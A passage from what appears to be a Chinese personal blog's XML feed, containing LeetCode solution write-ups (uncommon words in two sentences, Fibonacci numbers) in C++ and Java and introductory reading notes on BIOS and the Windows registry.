f127944618d3c95def4ce0aaa4a50a71a7ff897faca61bbbc57303bf6012fa9227004a12aa93cbfba818b8d0f154d87ccbc9a19acb741f6986d2cff46f738b7666b538cf238f7e67a9d7955a374b1aead09bbab2795f1f2f608600957b7b1899ce67060c5959862df63b9fcfe953f51847e0ce8c0d918e8d8595e</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>两句话中的不常见单词</title>
    <url>/2020/12/29/%E4%B8%A4%E5%8F%A5%E8%AF%9D%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%B8%B8%E8%A7%81%E5%8D%95%E8%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/uncommon-words-from-two-sentences/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定两个句子 <code>A</code> 和 <code>B</code> 。 （句子是一串由空格分隔的单词。每个单词仅由小写字母组成。）</p>
<p>如果一个单词在其中一个句子中只出现一次，在另一个句子中却没有出现，那么这个单词就是不常见的。</p>
<p>返回所有不常用单词的列表。</p>
<p>您可以按任何顺序返回列表。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; &quot;this apple is sweet&quot;, B &#x3D; &quot;this apple is sour&quot;</span><br><span class="line">输出：[&quot;sweet&quot;,&quot;sour&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; &quot;apple apple&quot;, B &#x3D; &quot;banana&quot;</span><br><span class="line">输出：[&quot;banana&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>0 &lt;= A.length &lt;= 200</code></li>
<li><code>0 &lt;= B.length &lt;= 200</code></li>
<li><code>A</code> 和 <code>B</code> 都只包含空格和小写字母。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述可以得出不常见单词就是在两个句子中出现总次数等于1的单词。于是遍历字符串A和B，空格作为单词之间的分隔使用计数法统计不同单词出现的次数存储在哈希容器中，最后遍历哈希容器把出现次数为1的单词添加到结果中。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7.2M，击败54.11%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">uncommonFromSentences</span><span class="params">(<span class="built_in">string</span> A, <span class="built_in">string</span> B)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        <span class="built_in">string</span> tmp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//为了处理最后一个单词给句子加上一个尾空格</span></span><br><span class="line">        A+=<span class="string">&quot; &quot;</span>;</span><br><span class="line">        B+=<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:A)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                tmp+=c;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ++m[tmp];</span><br><span class="line">                tmp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:B)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                tmp+=c;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ++m[tmp];</span><br><span class="line">                tmp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [i,j]:m)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">1</span>)&#123;</span><br><span class="line">                result.emplace_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/uncommon-words-from-two-sentences/solution/liang-ju-hua-zhong-de-bu-chang-jian-dan-ci-by-leet/">官方题解</a>:</h6><h4 id="方法-：计数"><a href="#方法-：计数" class="headerlink" title="方法 ：计数"></a>方法 ：计数</h4><p><strong>思路和算法</strong></p>
<p>个不常见的单词总共只出现一次。我们可以统计每个单词的出现次数，然后返回恰好出现一次的单词。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String[] uncommonFromSentences(String A, String B) &#123;</span><br><span class="line">        Map&lt;String, Integer&gt; count = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="keyword">for</span> (String word: A.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">            count.put(word, count.getOrDefault(word, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (String word: B.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">            count.put(word, count.getOrDefault(word, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; ans = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        <span class="keyword">for</span> (String word: count.keySet())</span><br><span class="line">            <span class="keyword">if</span> (count.get(word) == <span class="number">1</span>)</span><br><span class="line">                ans.add(word);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans.toArray(<span class="keyword">new</span> String[ans.size()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(M + N)$，其中 $M$, $N$分别是 <code>A</code> 和 <code>B</code> 的长度。</p>
</li>
<li><p>空间复杂度：$O(M + N)$，<code>count</code> 所用去的空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这道题的最优解应该就是使用计数法求解了，官方题解是使用Java语言做的，毕竟Java封装好了很多方法，比如直接把字符串通过split()方法根据空格分解成单词，不过使用C++也不错，总的来说题目比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>斐波那契数</title>
    <url>/2021/01/04/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/fibonacci-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p><strong>斐波那契数</strong>，通常用 <code>F(n)</code> 表示，形成的序列称为 <strong>斐波那契数列</strong> 。该数列由 <code>0</code> 和 <code>1</code> 开始，后面的每一项数字都是前面两项数字的和。也就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F(0) &#x3D; 0，F(1) &#x3D; 1</span><br><span class="line">F(n) &#x3D; F(n - 1) + F(n - 2)，其中 n &gt; 1</span><br></pre></td></tr></table></figure>
<p>给你 <code>n</code> ，请计算 <code>F(n)</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：2</span><br><span class="line">输出：1</span><br><span class="line">解释：F(2) &#x3D; F(1) + F(0) &#x3D; 1 + 0 &#x3D; 1</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：3</span><br><span class="line">输出：2</span><br><span class="line">解释：F(3) &#x3D; F(2) + F(1) &#x3D; 1 + 1 &#x3D; 2</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：4</span><br><span class="line">输出：3</span><br><span class="line">解释：F(4) &#x3D; F(3) + F(2) &#x3D; 2 + 1 &#x3D; 3</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= n &lt;= 30</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟，递归调用函数，终止条件是n为0或1。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败23.12%，内存消耗6.2M，击败42.65%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>)+fib(n<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/fibonacci-number/solution/fei-bo-na-qi-shu-by-leetcode-solution-o4ze/">官方题解</a>:</h6><p><strong>方法一：动态规划</strong><br>斐波那契数的边界条件是 $F(0)=0$和 $F(1)=1$由于斐波那契数存在递推关系，因此可以使用动态规划求解。动态规划的状态转移方程即为上述递推关系，边界条件为 $F(0)$和 $F(1)$。</p>
<p>根据状态转移方程和边界条件，可以得到时间复杂度和空间复杂度都是 O(n)O(n) 的实现。由于 $F(n)$ 只和 $F(n-1)$ 与 $F(n-2)$ 有关，因此可以使用「滚动数组思想」把空间复杂度优化成 $O(1)$。如下的代码中给出的就是这种实现。</p>
<p><img src="/2021/01/04/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0/509_fig1.gif" alt="fig1"></p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败63.84%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            p = q; </span><br><span class="line">            q = r; </span><br><span class="line">            r = p + q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：矩阵快速幂</strong><br>方法一的时间复杂度是 $O(n)$。使用矩阵快速幂的方法可以降低时间复杂度。</p>
<p>首先我们可以构建这样一个递推关系：</p>
<script type="math/tex; mode=display">
\left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] \left[ \begin{matrix} F(n)\\ F(n - 1) \end{matrix} \right] = \left[ \begin{matrix} F(n) + F(n - 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right]</script><p>因此：</p>
<script type="math/tex; mode=display">
\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]
[</script><p>令：</p>
<script type="math/tex; mode=display">
M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><p>因此只要我们能快速计算矩阵 $M$ 的 $n$次幂，就可以得到 $F(n)$ 的值。如果直接求取 $M^n$ ，时间复杂度是 $O(n)$，可以定义矩阵乘法，然后用快速幂算法来加速这里 $M^n$的求取。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败37.25%，内存消耗6.2M，击败36.44%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; q&#123;&#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res = matrix_pow(q, n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">matrix_pow</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ret&#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                ret = matrix_multiply(ret, a);</span><br><span class="line">            &#125;</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            a = matrix_multiply(a, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">matrix_multiply</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; a, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; c&#123;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">                c[i][j] = a[i][<span class="number">0</span>] * b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>] * b[<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(logn)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。</p>
</li>
</ul>
<p><strong>方法三：通项公式</strong><br>斐波那契数 $F(n)$是齐次线性递推，根据递推方程 $F(n)=F(n-1)+F(n-2)$，可以写出这样的特征方程：</p>
<script type="math/tex; mode=display">
x^2=x+1</script><p>求得 $x_1 = \frac{1+\sqrt{5}}{2}$ ，$x_2 = \frac{1-\sqrt{5}}{2}$ 。设通解为 $F(n)=c_1x_1^n+c_2x_2^n$ ，代入初始条件 $F(0)=0$，F(1)=1$F(1)=1$，得 $c_1=\frac{1}{\sqrt{5}}$ ，$c_2=-\frac{1}{\sqrt{5}}$ 。因此斐波那契数的通项公式如下：</p>
<script type="math/tex; mode=display">
F(n)=\frac{1}{\sqrt{5}}\left[ \left(\frac{1+\sqrt{5}}{2}\right)^{n} - \left(\frac{1-\sqrt{5}}{2}\right)^{n} \right]</script><p>得到通项公式之后，就可以通过公式直接求解第 $n$ 项。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.5M，击败5.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> sqrt5 = <span class="built_in">sqrt</span>(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">double</span> fibN = <span class="built_in">pow</span>((<span class="number">1</span> + sqrt5) / <span class="number">2</span>, n) - <span class="built_in">pow</span>((<span class="number">1</span> - sqrt5) / <span class="number">2</span>, n);</span><br><span class="line">        <span class="keyword">return</span> round(fibN / sqrt5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>代码中使用的 $\texttt{pow}$ 函数的时空复杂度与 CPU 支持的指令集相关，这里不深入分析。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解给出了多种解法，其中后两种方法跟数学结合较为紧密，第一种动态规划算法效率较高。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转BIOS与注册表</title>
    <url>/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>这两天逛图书馆看到了一本书《玩转BIOS与注册表》，因为自己上大学之前没接触过电脑，而大学以来一直学的比较多的都是软件相关的知识，很少涉及硬件，所以自己对硬件这方面的知识还是比较少的，所以对这本书很感兴趣，翻了翻觉得挺好玩的，这两天就看完了这本书，仅此记录一下书中一些好玩的、常用的部分。</p>
<a id="more"></a>
<h5 id="软硬件的转换器——主板BIOS"><a href="#软硬件的转换器——主板BIOS" class="headerlink" title="软硬件的转换器——主板BIOS"></a>软硬件的转换器——主板BIOS</h5><h6 id="BIOS的概念："><a href="#BIOS的概念：" class="headerlink" title="BIOS的概念："></a>BIOS的概念：</h6><p>BIOS是电脑中最基础、最重要的程序之一，为电脑提供最基层、最直接的硬件控制。</p>
<p>BIOS为Basic Input and Output System的缩写，意思为“基本输入/输出系统“，它在电脑系统中起着至关重要的作用。BIOS以芯片的形式存在于电脑主板上，被固化在只读存储器（Read Only Memory,ROM)中，又被称为ROM BIOS，不需要电源便可存储程序。</p>
<h6 id="BIOS的种类"><a href="#BIOS的种类" class="headerlink" title="BIOS的种类"></a>BIOS的种类</h6><p>按照不同的作用，可将BIOS分为普通BIOS和扩充BIOS两种。</p>
<ul>
<li>普通BIOS：指应用在主板上的ROM BIOS，这类BIOS主要有支持DOS的BIOS（如IBMBIOS）、支持PnP（即插即用设备）的BIOS和支持网络应用的BIOS。</li>
<li>扩充BIOS：指除普通BIOS外的其他BIOS，这类BIOS主要有硬盘BIOS（HDD BIOS），负责硬盘的启动和数据的读取；显卡/视频BIOS（Video BIOS），负责显卡与主板间信息的快速传递。</li>
</ul>
<h6 id="BIOS的品牌"><a href="#BIOS的品牌" class="headerlink" title="BIOS的品牌"></a>BIOS的品牌</h6><p>为了更好地支持电脑硬件地运行，很多著名地电脑厂家都研发了自身品牌的BIOS，且各厂家生产的BIOS在外观和主要功能上都有所不同。</p>
<ul>
<li>AMI BIOS</li>
<li>Phoenix BIOS</li>
<li>Award BIOS</li>
<li>Phoenix-AwardBIOS</li>
<li>EFI BIOS</li>
</ul>
<h6 id="BIOS的作用"><a href="#BIOS的作用" class="headerlink" title="BIOS的作用"></a>BIOS的作用</h6><p>在电脑中，BIOS相当于硬件与软件之间的”转换器“，负责解决硬件的即时需求，即根据软件对硬件的操作要求执行开机自检、终端服务、系统设置和系统启动控制。</p>
<p><strong>开机自检（POST程序）</strong></p>
<p>开机时检查各硬件设备是否正常工作，主要时对CPU、基本内存、扩展内存、ROM、主板、CMOS存储器、串并口、显示卡、软/硬盘子系统及键盘进行测试。</p>
<p><strong>终端服务</strong></p>
<p>操作系统中软件与硬件之间的一个接口，可对硬盘、光驱、键盘和显示器等外围设备进行管理。</p>
<p><strong>系统设置</strong></p>
<p>硬件配置信息存储在一块可读写的CMOS RAM芯片中，通过BIOS的系统设置程序可设置CMOS RAM芯片中的各项硬件参数。</p>
<p><strong>系统启动控制</strong></p>
<ul>
<li>检测硬件是否正常工作</li>
<li>正确添加新设备</li>
<li>支持操作系统安装</li>
<li>提升BIOS版本</li>
</ul>
<h6 id="BIOS与CMOS的联系与区别"><a href="#BIOS与CMOS的联系与区别" class="headerlink" title="BIOS与CMOS的联系与区别"></a>BIOS与CMOS的联系与区别</h6><p>CMOS中存储了系统开机自检过程中所需的硬件相关信息和用户设置参数。系统通过读取CMOS的信息初始化电脑各个设备的状态，使各硬件正常地工作。</p>
<p><strong>CMOS和BIOS的联系：</strong>用户通过BIOS设置程序对CMOS参数进行设置，并将设置结果保存在CMOS芯片中。通常，BIOS设置是指通过BIOS中的设置程序修改CMOS中的参数，CMOS设置是指进入BIOS中的设置程序修改CMOS芯片中的参数。</p>
<p><strong>CMOS和BIOS的区别：</strong>通常可将CMOS看成是”硬件“，将BIOS看成是管理该硬件的”软件“，它们是两个不同的概念。由于CMOS只是一个存储数据参数的芯片，要修改其中的参数就需要使用BIOS中的设置程序。</p>
<p><strong>注：</strong></p>
<p>BIOS不同品牌BIOS设置页面大同小异且日常使用较少，不再展开介绍。</p>
<h5 id="系统环境的控制器——注册表"><a href="#系统环境的控制器——注册表" class="headerlink" title="系统环境的控制器——注册表"></a>系统环境的控制器——注册表</h5><h6 id="注册表的概念"><a href="#注册表的概念" class="headerlink" title="注册表的概念"></a>注册表的概念</h6><p>注册表（Registry）是微软公司引入来管理配置系统运行参数的一个全新的核心数据库。在这个数据库中整合集成了全部系统和应用程序的初始化信息，它具有方便管理、安全性较高、适于网络操作等特点，</p>
<h6 id="注册表的特点"><a href="#注册表的特点" class="headerlink" title="注册表的特点"></a>注册表的特点</h6><p>二进制登录形式：注册表采用的是二进制形式登录数据，比采用文本形式登录数据的形式更加简单可靠。</p>
<p>支持子关键字：注册表支持子关键字，各级子关键字都有自身的键值，与支持节以及节中的参数相比更加可靠方便。</p>
<h6 id="注册表的功能"><a href="#注册表的功能" class="headerlink" title="注册表的功能"></a>注册表的功能</h6><p>注册表在电脑中起着核心的作用，通过注册表能帮助Windows操作系统对软、硬件及用户环境进行控制。</p>
<ul>
<li>提高系统性能</li>
<li>增加系统安全性</li>
<li><p>设置个性化系统</p>
</li>
<li><p>解决常见故障</p>
</li>
<li><p>便于网络管理</p>
</li>
</ul>
<h6 id="注册表的工作原理"><a href="#注册表的工作原理" class="headerlink" title="注册表的工作原理"></a>注册表的工作原理</h6><p>用户安装Windows操作系统时，首先启动安装程序扫描电脑的配置，将扫描结果保存在一个容器中，该容器就是注册表，同时会在操作系统所在的分区根目录下生成一个System.1st文件。在注册表中，存储了驱动程序的位置、版本等硬件相关信息，这使操作系统能通过安装的驱动程序对硬件设备进行控制，同样当启动一个应用程序时，会调用注册表中与该应用程序相关的设置。</p>
<h6 id="注册表的保存位置与逻辑结构"><a href="#注册表的保存位置与逻辑结构" class="headerlink" title="注册表的保存位置与逻辑结构"></a>注册表的保存位置与逻辑结构</h6><p><strong>注册表文件的保存位置：</strong>Windows操作系统的系统配置与用户配置数据存放在系统所在磁盘的Windows\System32\config文件夹目录中</p>
<p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20201228114213072.png" alt="image-20201228114213072"></p>
<p><strong>注册表的逻辑结构：</strong>在注册表编辑器中，使用树形列表的方式来组织和管理数据信息，这种方式与Windows操作系统中的资源管理器相似，其中数据信息由根键、子键、键值项及键值4部分组成。</p>
<h6 id="注册表编辑器的结构"><a href="#注册表编辑器的结构" class="headerlink" title="注册表编辑器的结构"></a>注册表编辑器的结构</h6><p><img src="/2020/12/28/%E7%8E%A9%E8%BD%ACBIOS%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8/image-20201228120538565.png" alt="image-20201228120538565"></p>
<p><strong>注册表的根键</strong></p>
<p>1、HKEY_CLASSES_ROOT：存储了操作系统中所有的应用程序格式文件类型，其子键包括已注册的各类文件的扩展名以及各类文件类型的相关信息两类。</p>
<p>2、HKEY_CURRENT_USER：存储了当前用户的所有配置信息，包括用户登录名、登录密码、登录权限和预配置信息等，不同用户对电脑的不同个性设置都将在这里体现。</p>
